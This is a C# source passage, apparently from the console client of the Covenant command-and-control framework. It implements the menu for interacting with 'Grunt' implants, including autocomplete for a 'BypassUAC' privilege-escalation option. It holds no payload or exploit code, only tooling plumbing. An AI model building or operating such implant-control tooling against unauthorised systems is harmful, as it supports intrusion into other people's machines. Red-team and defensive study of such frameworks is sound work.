                    .Where(GT => GT.Status == GruntTaskingStatus.Completed)
                    .Select(GT => new MenuCommandParameterValue { Value = GT.Name })
                    .ToList();

            this.AdditionalOptions.FirstOrDefault(AO => AO.Name == "BypassUAC").Parameters.FirstOrDefault().Values =
                    this.CovenantClient.ApiLaunchersGet()
                    .Select(L => new MenuCommandParameterValue { Value = L.Name })
                    .ToList();

            this.SetupMenuAutoComplete();
        }

        public override bool ValidateMenuParameters(string[] parameters, bool forwardEntrance = true)
        {
            if (forwardEntrance)
            {
                if (parameters.Length != 1)
                {
                    EliteConsole.PrintFormattedErrorLine("Must specify a GruntName.");
                    EliteConsole.PrintFormattedErrorLine("Usage: Interact <grunt_name>");
                    return false;
                }
                string gruntName = parameters[0].ToLower();
                Grunt specifiedGrunt = CovenantClient.ApiGruntsGet().FirstOrDefault(G => G.Name.ToLower() == gruntName);
                if (specifiedGrunt == null)
                {
                    EliteConsole.PrintFormattedErrorLine("Specified invalid GruntName: " + gruntName);
                    EliteConsole.PrintFormattedErrorLine("Usage: Interact <grunt_name>");
                    return false;
                }
                this.MenuTitle = gruntName;
                this.grunt = specifiedGrunt;
            }
            this.Refresh();
            return true;
        }

        public override void PrintMenu()
        {
            this.AdditionalOptions.FirstOrDefault(O => O.Name == "Show").Command(this, "");
        }

        public override void LeavingMenuItem()
        {
            this.MenuTitle = "Interact";
        }
    }
}